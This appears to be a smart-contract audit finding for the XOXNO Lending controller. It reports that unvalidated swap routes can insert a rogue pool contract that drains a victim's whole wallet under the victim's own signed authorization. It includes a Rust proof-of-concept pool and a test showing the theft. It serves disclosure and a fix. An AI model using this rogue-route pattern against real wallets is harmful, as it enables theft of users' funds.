### Title
Attacker-crafted swap route injects arbitrary contract calls under the caller's signed authorization, draining wallet tokens unrelated to the swap - ([File: contracts/controller/src/strategies/swap_collateral.rs](contracts/controller/src/strategies/swap_collateral.rs))

### Summary
CVE-2016-7789 is SQL injection: an attacker-controlled parameter (`apikey`) is concatenated into a privileged operation so arbitrary attacker-chosen statements execute under the victim's authority. The analog in XOXNO Lending is the opaque `swap: Bytes` route payload accepted by the controller's strategy entrypoints (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`). The router deserializes and executes whatever pool/venue addresses the payload names with no allowlist, so a malicious route "injects" a rogue contract onto the call stack beneath the caller's `require_auth` tree, where it can invoke `token.transfer(caller, attacker, ...)` on any token in the caller's wallet — far beyond the routed amount.

### Finding Description
`process_swap_collateral` validates only the caller's authorization, hub activity, and a positive amount; the `swap` bytes are forwarded uninterpreted to `withdraw_and_swap_from_supply`, which delegates to the configured swap aggregator [1](#0-0) . The threat model documents that the router "calls the pool and token addresses its payload names and keeps no allowlist", so route code executes as a child invocation and any `token.transfer` it makes from the caller is recorded under — and authorized by — the caller's signed auth tree [2](#0-1) . The harness test demonstrates this concretely: a `RogueHopPool` named in the route calls `token::Client::transfer(victim, attacker, WALLET_BALANCE)` on an unlisted wallet token, and the recorded auth tree shows the stolen transfer nested directly under the victim's `swap_collateral` entry [3](#0-2) . This is not mere MEV/route quality — the victim's entire balance of a token the protocol never touched is exfiltrated.

### Impact Explanation
Theft of user funds: a single signed `swap_collateral` (or `swap_debt`, `repay_debt_with_collateral`, or direct `execute_strategy`) call lets route code drain every token the victim holds, unbounded by the routed input amount, the payload `min_out`, or the final health-factor gate [4](#0-3) .

### Likelihood Explanation
Reachable by any unprivileged attacker who can get a victim to sign a crafted route (malicious frontend, phishing payload, or compromised route builder — no protocol keys required). The recorded-auth simulation shows the injection requires no additional victim signature beyond the swap itself [5](#0-4) . Caveat: the threat model already documents this hazard and frames mitigation as a client-side duty to decode routes before signing; whether that constitutes an accepted design decision is a scoping question, but the loss path is real and demonstrated.

### Recommendation
Enforce a route/venue allowlist (or at minimum validate that every contract address decoded from `swap` belongs to a known pool/token set) inside the swap aggregator, and/or have the controller cap authorization scope so child invocations cannot transfer tokens beyond the declared `token_in`/`token_out` and measured amounts. Until then, clients must refuse any authorization tree containing children other than the single expected input transfer.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: `Scene::route_through_pool_stealing` builds a `RoutedSwap` naming a `RogueHopPool` whose `swap()` transfers the victim's entire `WALLET_BALANCE` (77,770 units of an unrelated token) to the attacker. `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` asserts the recorded auth tree nests the theft under `swap_collateral` and that `wallet(alice) == 0` while `wallet(attacker) == WALLET_BALANCE` [6](#0-5) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-55)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
